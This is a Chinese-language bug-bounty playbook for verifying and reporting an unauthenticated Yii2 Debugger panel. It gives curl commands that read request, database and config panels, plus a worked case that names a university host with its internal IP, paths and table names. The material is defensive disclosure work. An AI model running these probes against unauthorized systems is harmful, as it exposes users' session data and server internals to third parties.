# NJAU mool Yii Debugger 未授权访问模式（2026-06-05）

## 适用场景

教育 SRC 目标中出现 Yii2/PHP 平台，响应头或页面含：

- `X-Debug-Tag`
- `X-Debug-Link: /debug/default/view?tag=...`
- `/debug/default/index`
- 页面标题 `Yii Debugger`
- 顶部工具栏显示 `Yii Debugger 2.0.x PHP 7.x`、`Guest`、`DB`、`Route`

这类不是普通“版本信息泄露”，而是生产调试面板暴露。若可未授权访问 `debug/default/index` 和 `debug/default/view?...&panel=request|db|config`，通常可按高危提交。

## 关键验证链

1. 访问 debug index：

```bash
curl -ksS -A 'Mozilla/5.0' 'https://TARGET/debug/default/index' | grep -E 'Yii Debugger|Available Debug Data|Query Count|Status code|Guest' -n
```

2. 发送无害 marker 请求，证明外部请求会实时进入公开调试列表：

```bash
curl -ksS -A 'Mozilla/5.0 Hermes SRC low-noise' 'https://TARGET/some/public/page?hermes_marker=NJAU-Hermes-safe-upload-test' -o /dev/null -D /tmp/marker.hdr
```

3. 再查 debug index，定位 marker 对应 tag：

```bash
curl -ksS -A 'Mozilla/5.0' 'https://TARGET/debug/default/index' | grep -E 'NJAU-Hermes-safe-upload-test|Query Count|Status code|Available Debug Data' -n
```

4. 读取 request 面板，证明可见请求参数、Header、Session、`$_SERVER`、部署路径、内网地址：

```bash
curl -ksS -A 'Mozilla/5.0' 'https://TARGET/debug/default/view?tag=TAG&panel=request' | grep -E 'Request Parameters|hermes_marker|\$_GET|\$_SERVER|DOCUMENT_ROOT|SCRIPT_FILENAME|SERVER_ADDR|PHPSESSID|X-Debug-Link' -n
```

5. 读取 database 面板，证明可见 SQL、表名、模型调用链：

```bash
curl -ksS -A 'Mozilla/5.0' 'https://TARGET/debug/default/view?tag=TAG&panel=db' | grep -E 'Database Queries|SELECT|SHOW FULL COLUMNS|`users`|`teacher`|`course`|/home/wwwroot|/var/www|/wwwroot' -n
```

6. 读取 config 面板，证明可见 PHP/Yii/扩展/路径/数据库驱动等运行环境：

```bash
curl -ksS -A 'Mozilla/5.0' 'https://TARGET/debug/default/view?tag=TAG&panel=config' | grep -E 'PHP Version|Application Configuration|Yii|mysql|Route|DOCUMENT_ROOT|/home/wwwroot|/var/www|/wwwroot' -n
```

## 证据门禁

可提交条件：

- `debug/default/index` 无需登录访问；
- 至少一个 `view?tag=...&panel=request` 可读；
- 能通过无害 marker 证明调试面板实时记录公网请求；
- request/db/config/log 至少两个面板可读到高价值信息：请求参数、Cookie/Session 结构、`$_SERVER`、内网 IP、部署路径、SQL、表名、源码调用路径之一；
- 保存截图和响应体，报告中给单行 curl。

不建议提交/需降级条件：

- 仅首页返回 `X-Debug-Link` 但 `/debug/default/view` 需要鉴权或 403；
- 只看到 Yii/PHP 版本，无 request/db/config 真实面板；
- 只能读取自己构造的 marker 请求，且无法看到任何服务器路径、SQL、Session/Cookie 结构或运行环境细节（按低危边界处理）。

## 报告角度

标题建议：

`学校名 + 系统名 Yii Debugger 未授权访问导致请求、服务器路径、数据库查询与运行环境信息泄露`

漏洞等级：高危（当 request + db/config/log 面板均可读时）。

影响写法：

- 攻击者可查看生产请求调试数据、最近访问记录、请求参数、Header、Cookie/Session 结构；
- 可见数据库 SQL、表名、字段枚举入口和模型调用链，辅助 SQLi/越权/接口定位；
- 可见服务器内网 IP、Web 根目录、脚本路径、PHP/Yii/nginx/php-fpm 版本与部署细节；
- 若真实用户请求包含 token、敏感参数或业务请求体，可能被未授权第三方读取。

## 修复建议

- 生产环境关闭 Yii Debug Module，确保 `YII_DEBUG=false`、`YII_ENV=prod`；
- 删除/禁用 `/debug/default/*` 路由；
- 临时调试仅允许 VPN/内网/固定管理员 IP，并加独立认证；
- 清理已暴露调试缓存，排查是否含 Cookie、Session、Token、个人信息或敏感业务请求；
- Web 服务器层阻断 `/debug/`、`/gii/` 等开发路径公网访问。

## 实战样例

NJAU `mool.njau.edu.cn`：

- `/debug/default/index` 公开显示 `Yii Debugger 2.0.45 PHP 7.4.33`、`Guest`、最近 50 条请求；
- marker 请求 `hermes_marker=NJAU-Hermes-safe-upload-test` 立即出现在列表；
- request 面板可见 `$_GET`、`$_SESSION`、`$_SERVER`、`SERVER_ADDR 172.30.25.252`、`DOCUMENT_ROOT /home/wwwroot/mool/web`、`SCRIPT_FILENAME /home/wwwroot/mool/web/index.php`；
- db 面板可见 `SELECT`、`SHOW FULL COLUMNS`、`users`、`teacher`、`course`、`config` 等表名与源码路径；
- config 面板可见 PHP 7.4.33、Yii 2.0.45、mysql 扩展等。